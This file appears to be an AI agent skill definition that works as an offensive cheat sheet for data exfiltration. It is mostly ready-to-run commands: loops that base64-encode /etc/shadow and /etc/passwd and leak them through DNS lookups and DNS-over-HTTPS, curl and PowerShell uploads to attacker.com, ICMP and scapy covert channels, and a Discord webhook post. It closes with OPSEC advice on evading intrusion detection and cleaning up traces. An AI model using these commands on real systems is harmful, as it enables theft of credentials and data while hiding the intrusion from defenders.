---
name: data-exfiltration
description: Covert data transfer channels, DNS exfil, steganography, tunneling.
---

# Data Exfiltration Techniques

## 1. DNS Exfiltration

```bash
# Using dnscat2
# Server (attacker)
dnscat2-server domain.com
# Client (target)
dnscat2 domain.com

# Manual DNS exfil
for chunk in $(cat /etc/shadow | base64 | fold -w 30); do
    nslookup "$chunk.exfil.attacker.com"
done
```

## 2. HTTP/HTTPS Exfiltration

```bash
# Using curl
curl -X POST -F "file=@/etc/shadow" https://attacker.com/upload

# Using PowerShell
Invoke-WebRequest -Uri https://attacker.com/upload -Method POST -InFile /etc/shadow

# Using Rclone (cloud storage)
rclone copy /sensitive/data remote:backup --progress
```

## 3. Steganography

```bash
# Hide data in image (steghide)
steghide embed -cf image.jpg -ef secret.txt -p ""

# Hide in PNG LSB
python3 -c "
from stegano import lsb
from PIL import Image
img = Image.open('cover.png')
# LSB embedding
"
```

## 4. DNS-over-HTTPS (DoH)

```bash
# Exfil via DoH to avoid DNS monitoring
for chunk in $(cat /etc/passwd | base64 | fold -w 50); do
    curl "https://dns.google/resolve?name=$chunk.exfil.com&type=TXT"
done
```

## 5. Covert Channels

### ICMP Exfil
```bash
# Hide data in ICMP packets
ping -c 1 -p "$(echo 'secret_data' | xxd -p)" attacker.com
```

### TCP/IP Header Covert Channel
```python
# Hide data in IP ID field, TCP sequence numbers, or timestamps
from scapy import *
pkt = IP(dst="attacker.com")/ICMP()/"hidden_data"
send(pkt)
```

### Social Media / Cloud
```bash
# Post data as encoded text to Twitter/Telegram/Discord webhook
curl -X POST -H "Content-Type: application/json" \
  -d '{"content":"'$(cat /etc/shadow | base64)'"}' \
  https://discord.com/api/webhooks/xxx/yyy
```

## 6. Exfil via Legitimate Services

| Service | Method |
|---------|--------|
| Google Drive | `rclone copy data gdrive:backup` |
| Dropbox | API upload |
| Telegram Bot | Send file to bot |
| Pastebin | POST encoded data |
| GitHub Private Repo | Push to private repo |

## 7. OPSEC

- Use encrypted channels (HTTPS, DoH)
- Throttle exfil rate (avoid spikes)
- Use legitimate services to blend in
- Clean up after exfil
- Monitor target's IDS/IPS rules
